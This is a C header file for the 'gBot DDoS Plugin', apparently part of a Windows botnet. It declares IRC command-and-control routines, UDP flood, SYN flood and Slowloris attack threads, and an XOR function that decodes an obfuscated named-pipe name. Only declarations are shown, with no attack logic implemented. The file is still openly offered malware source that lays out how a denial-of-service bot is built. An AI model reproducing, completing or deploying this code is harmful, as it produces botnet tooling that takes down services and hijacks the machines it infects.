/*
	gBot DDoS Plugin
	by: jam3s/fubar;
*/

#if !defined(AFX_STDAFX_H__9ECCD876_BB3C_406C_AB5E_7B3FA7DB791D__INCLUDED_)
#define AFX_STDAFX_H__9ECCD876_BB3C_406C_AB5E_7B3FA7DB791D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/* Pragmas */
#pragma warning(disable:4018)

/* Definitions */
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers
//#define _DEBUGLITE
#define _WITHMUTEX
#define __FUNCTION__ "DDoS"
#define KEY ""
//#define GBOTPIPE "\\\\.\\pipe\\gBot"
#define GBOTPIPE "››Ø›ÒËÒ‰›Ê√ÓıÛË‚È"

/* Includes */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#include <urlmon.h>

/* Structs */
typedef struct _SERVERS
{
	char szDNS[MAX_PATH];
	long lPort;
	char szChannel[MAX_PATH];
} sServers, *pServers;

typedef struct _FLOOD
{
	SOCKET sock;
	char from[256];
	char ip[256];
	char port[256];
	char length[256];
	char slowtype[256];
	int mins;
	int times;
	int Type;
} sFlood, *pFlood;

typedef struct
{
    SOCKET sock;
	int	   threadnum;
	int    start;
	int    current;
	char   ip[250];
	char   port[250];
	char   length[250];
} SUPERSYN;

typedef struct
{
	SOCKET sock;
	int    threadnum;
    int    start;
    int    current;
	char   ip[250];
	char   port[250];
	char   length[250];
} UDPFLOOD;

/* Prototypes */
// - Main
void DbugMsg(char* s, ...);
void Unload();
BOOL Verify_gBot();
char *sexor(char *string, char *decode_key);
// - Other
char **Explode(char *StrIn,const char *Delimiter);

// - IRC
DWORD WINAPI Thread_IRC(LPVOID lpParam);
char *Generate_NICK();
char *IRC_Login();
int IRC_PrivMsg(SOCKET sock, char *To, char *szMessage, ...);
int IRC_Parse(SOCKET sock, char *szData);
int IRC_ParseLines(SOCKET sock, char *szLine);
int IRC_ParseCommand(SOCKET sock, char *from, char **szWords);
// - DDoS
DWORD WINAPI Thread_DDoS(LPVOID lpParam);
unsigned int Resolve(char *host);
void udpflood(char *ip, char *port, char *length);
void ssyn(char *target, char *port, char *length);
// -- SlowLoris
int RealRand(int Max);
char *Generate_Header(char *szMethod, char *szHost);
DWORD WINAPI PerformSlowloris_Thread(LPVOID lpParam);
DWORD WINAPI Slowloris_Thread(LPVOID lpParam);
DWORD WINAPI HTTP_Thread(LPVOID lpParam);

#endif 
